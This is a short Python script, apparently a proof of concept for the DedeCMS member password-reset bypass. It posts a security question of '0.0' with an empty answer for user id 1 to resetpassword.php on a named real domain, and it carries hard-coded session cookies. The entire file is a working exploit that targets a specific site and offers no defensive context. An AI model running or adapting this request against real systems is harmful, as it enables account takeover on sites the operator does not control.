import requests



if __name__ == '__main__':
    "dopost=safequestion&safequestion=0.0&safeanswer=&id=1"
    params = {"dopost":"safequestion","safequestion":"0.0","safeanswer":"","id":1}
    headers = {"Cookie":"Hm_lpvt_2e6c93ae6c8816296466cd1df81a2b47=1598325186; Hm_lvt_2e6c93ae6c8816296466cd1df81a2b47=1598324489; _csrf_name_c038644c=25e2b6a9ad2849bb5aaf490b69a0d064; _csrf_name_c038644c__ckMd5=2bdef7f267c0226c; DedeLoginTime=1598325438; DedeLoginTime__ckMd5=8042658f0292107e; DedeUserID=0000002; DedeUserID__ckMd5=8d4cf8bb69105213; last_vid=0000002; last_vid__ckMd5=8d4cf8bb69105213; last_vtime=1598325424; last_vtime__ckMd5=cacd402a5ca1b9ec; PHPSESSID=5sjir28tnr38om2cnjik0436m0"}
    a = requests.post(url="http://www.ihtxt.com/member/resetpassword.php",params=params, headers=headers)
    print(a.text)